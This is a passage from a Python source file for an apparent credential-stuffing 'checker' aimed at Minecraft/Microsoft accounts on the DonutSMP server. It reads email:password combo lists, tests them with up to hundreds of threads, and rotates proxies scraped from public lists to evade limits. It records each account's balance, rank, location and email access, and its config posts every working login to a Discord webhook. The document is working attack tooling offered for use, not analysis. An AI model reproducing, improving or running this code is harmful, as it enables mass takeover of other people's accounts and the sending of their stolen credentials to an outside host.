    print(f"{Fore.LIGHTGREEN_EX}Xbox Game Pass Ultimate: {Style.RESET_ALL}" + str(xgpu))
    print(f"{Fore.YELLOW}Other: {Style.RESET_ALL}" + str(other))
    print(f"{Fore.LIGHTMAGENTA_EX}Valid Mail: {Style.RESET_ALL}" + str(vm))
    print(f"{Fore.LIGHTRED_EX}Press any key to exit.{Style.RESET_ALL}")
    repr(readchar.readkey())
    os.abort()

def getproxy():
    if proxytype == "'5'": return random.choice(proxylist)
    if proxytype != "'4'": 
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'" or proxytype  == "'4'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def Checker(combo):
    global bad, checked, cpm
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(f"{Fore.RED}Bad: {combo.strip()}{Style.RESET_ALL}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(f"{Fore.RED}Bad: {combo.strip()}{Style.RESET_ALL}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global maxretries, config
    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        c['Settings'] = {
            'Webhook': 'paste your discord webhook here',
            'Max Retries': 5,
            'WebhookMessage': '🍩 **NEW DONUTSMP ACCOUNT HIT!** 🍩 ||`<email>:<password>`||',
            'DonutSMP API Key': DONUTSMP_API_KEY
        }
        c['Scraper'] = {
            'Auto Scrape Minutes': 5
        }
        c['Captures'] = {
            'DonutSMP Name': True,
            'DonutSMP Rank': True,
            'DonutSMP Level': True,
            'DonutSMP Balance': True,
            'DonutSMP Playtime': True,
            'DonutSMP Kills': True,
            'DonutSMP Deaths': True,
            'DonutSMP Blocks Broken': True,
            'DonutSMP Blocks Placed': True,
            'DonutSMP Shards': True,
            'DonutSMP Base Found': True,
            'DonutSMP Location': True,
            'DonutSMP Mobs Killed': True,
            'DonutSMP Money Spent': True,
            'DonutSMP Money Made': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Name Change Availability': True,
            'Last Name Change': True
        }
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    maxretries = int(read_config['Settings']['Max Retries'])
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))
    config.set('donutsmp_api_key', str(read_config['Settings']['DonutSMP API Key']))
    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    config.set('donutsmpname', str_to_bool(read_config['Captures']['DonutSMP Name']))
    config.set('donutsmprank', str_to_bool(read_config['Captures']['DonutSMP Rank']))
    config.set('donutsmplevel', str_to_bool(read_config['Captures']['DonutSMP Level']))
    config.set('donutsmpbalance', str_to_bool(read_config['Captures']['DonutSMP Balance']))
    config.set('donutsmpplaytime', str_to_bool(read_config['Captures']['DonutSMP Playtime']))
    config.set('donutsmpkills', str_to_bool(read_config['Captures']['DonutSMP Kills']))
    config.set('donutsmpdeaths', str_to_bool(read_config['Captures']['DonutSMP Deaths']))
    config.set('donutsmpblocksbroken', str_to_bool(read_config['Captures']['DonutSMP Blocks Broken']))
    config.set('donutsmpblocksplaced', str_to_bool(read_config['Captures']['DonutSMP Blocks Placed']))
    config.set('donutsmpshards', str_to_bool(read_config['Captures']['DonutSMP Shards']))
    config.set('donutsmpbasefound', str_to_bool(read_config['Captures']['DonutSMP Base Found']))
    config.set('donutsmplocation', str_to_bool(read_config['Captures']['DonutSMP Location']))
    config.set('donutsmpmobs_killed', str_to_bool(read_config['Captures']['DonutSMP Mobs Killed']))
    config.set('donutsmpmoney_spent', str_to_bool(read_config['Captures']['DonutSMP Money Spent']))
    config.set('donutsmpmoney_made', str_to_bool(read_config['Captures']['DonutSMP Money Made']))
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    
    # Updated proxy sources for 2023-2024
    api_http = [
        "https://api.proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"
    ]
    
    api_socks4 = [
        "https://api.proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks4",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt"
    ]
    
    api_socks5 = [
        "https://api.proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/socks5.txt"
    ]
    
    # Fetch HTTP proxies
    for service in api_http:
        try:
            response = requests.get(service, timeout=10)
            if response.status_code == 200:
                if 'geonode.com' in service:
                    # Parse JSON response from Geonode
                    data = response.json()
                    for proxy in data.get('data', []):
                        ip = proxy.get('ip')
                        port = proxy.get('port')
                        if ip and port:
                            http.append(f"{ip}:{port}")
                else:
                    # Parse text response from GitHub
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        if proxy and ':' in proxy:
                            http.append(proxy)
        except:
            pass
    
    # Fetch SOCKS4 proxies
    for service in api_socks4:
        try:
            response = requests.get(service, timeout=10)
            if response.status_code == 200:
                if 'geonode.com' in service:
                    # Parse JSON response from Geonode
                    data = response.json()
                    for proxy in data.get('data', []):
                        ip = proxy.get('ip')
                        port = proxy.get('port')
                        if ip and port:
                            socks4.append(f"{ip}:{port}")
                else:
                    # Parse text response from GitHub
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        if proxy and ':' in proxy:
                            socks4.append(proxy)
        except:
            pass
    
    # Fetch SOCKS5 proxies
    for service in api_socks5:
        try:
            response = requests.get(service, timeout=10)
            if response.status_code == 200:
                if 'geonode.com' in service:
                    # Parse JSON response from Geonode
                    data = response.json()
                    for proxy in data.get('data', []):
                        ip = proxy.get('ip')
                        port = proxy.get('port')
                        if ip and port:
                            socks5.append(f"{ip}:{port}")
                else:
                    # Parse text response from GitHub
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        if proxy and ':' in proxy:
                            socks5.append(proxy)
        except:
            pass
    
    # Remove duplicates and convert to proper format
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    
    proxylist.clear()
    for proxy in http: proxylist.append({'http': 'http://'+proxy, 'https': 'http://'+proxy})
    for proxy in socks4: proxylist.append({'http': 'socks4://'+proxy,'https': 'socks4://'+proxy})
    for proxy in socks5: proxylist.append({'http': 'socks5://'+proxy,'https': 'socks5://'+proxy})
    
    if screen == "'2'": print(f"{Fore.LIGHTBLUE_EX}Scraped [{len(proxylist)}] proxies{Style.RESET_ALL}")
    time.sleep(config.get('autoscrape') * 60)
    get_proxies()

def Main():
    global proxytype, screen
    utils.set_title("🍩 DONUTSMP CHECKER 🍩")
    os.system('cls')
    try:
        loadconfig()
    except:
        print(f"{Fore.RED}There was an error loading the config. Please delete the old config and reopen the checker.{Style.RESET_ALL}")
        input()
        exit()
        
    print(logo)
    try:
        print(f"{Fore.LIGHTBLACK_EX}(Recommended threads: 100-300. Use fewer threads if proxyless.){Style.RESET_ALL}")
        thread = int(input(f"{Fore.LIGHTBLUE_EX}Threads: {Style.RESET_ALL}"))
    except:
        print(f"{Fore.LIGHTRED_EX}Must be a number.{Style.RESET_ALL}") 
        time.sleep(2)
        Main()
    print(f"{Fore.LIGHTBLUE_EX}Proxy Type: [1] Http - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper{Style.RESET_ALL}")
    proxytype = repr(readchar.readkey())
    cleaned = int(proxytype.replace("'", ""))
    if cleaned not in range(1, 6):
        print(f"{Fore.RED}Invalid Proxy Type [{cleaned}]{Style.RESET_ALL}")
        time.sleep(2)
        Main()
    print(f"{Fore.LIGHTBLUE_EX}Screen: [1] CUI - [2] Log{Style.RESET_ALL}")
    screen = repr(readchar.readkey())
    print(f"{Fore.LIGHTBLUE_EX}Select your combos{Style.RESET_ALL}")
    Load()
    if proxytype != "'4'" and proxytype != "'5'":
        print(f"{Fore.LIGHTBLUE_EX}Select your proxies{Style.RESET_ALL}")
        Proxys()
    if proxytype =="'5'":
        print(f"{Fore.LIGHTGREEN_EX}Scraping Proxies Please Wait.{Style.RESET_ALL}")
        threading.Thread(target=get_proxies).start()
        while len(proxylist) == 0: 
            time.sleep(1)
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    finishedscreen()
    input()

if __name__ == "__main__":
    Main()